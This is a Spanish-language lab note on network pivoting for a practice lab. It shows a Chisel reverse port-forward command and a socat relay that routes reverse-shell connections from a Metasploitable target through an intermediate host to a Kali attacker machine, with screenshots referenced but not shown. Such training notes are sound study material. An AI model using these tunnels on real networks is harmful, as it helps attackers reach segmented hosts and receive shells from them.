[[Lab Pivoting and Tunneling - Synfonos]]
#pivoting 
Tendremos el siguiente escenario:
![[Pasted image 20240615202048.png]]

Chisel es una herramienta de pivoting compatible tanto con máquinas Windows como Linux. Nos permite de forma muy cómoda prácticamente obtener las mismas funciones que SSH (en el aspecto de Port Forwarding).

Tenemos un repositorio oficial para descargar la herramienta:
```bash
https://github.com/jpillora/chisel/releases
```

![[Pasted image 20240615202101.png]]

![[Pasted image 20240615202106.png]]

Nos lo descargamos en nuestra máquina atacante:
![[Pasted image 20240615202118.png]]

![[Pasted image 20240615202122.png]]

Y ahora ejecutamos el servidor con chisel desde nuestra máquina kali para recibir las conexiones:
![[Pasted image 20240615202130.png]]

A continuación, ejecutamos el siguiente comando en la máquina intermedia para indicar que el puerto 80 de la máquina final se convierta en el puerto 5000 de mi máquina atacante:
```bash
./chisel client 192.168.0.37:1234 R:5000:10.10.10.11:80
```

![[Pasted image 20240615202146.png]]

Y entonces ahora nuestro localhost de la máquina kali por el puerto 5000 será el puerto 80 de la máquina final:
![[Pasted image 20240615202153.png]]

Ahora, si queremos conseguir una reverse shell, tenemos que utilizar socat, ya que nosotros podemos ver a la máquina metasploitable, pero sin embargo esta máquina no nos ve a nosotros, por lo que dentro de la máquina intermedia ejecutamos el siguiente comando:
```bash
socat tcp-l:443,fork,reuseaddr tcp:192.168.0.30:443
```
Y ahora ya podríamos efectuar cualquier ataque desde la máquina Kali y recibir la conexión desde la máquina final, pasando primero por el puerto 443 de la máquina ubuntu y luego enviando dicha conexión al puerto 443 de la máquina Kali.
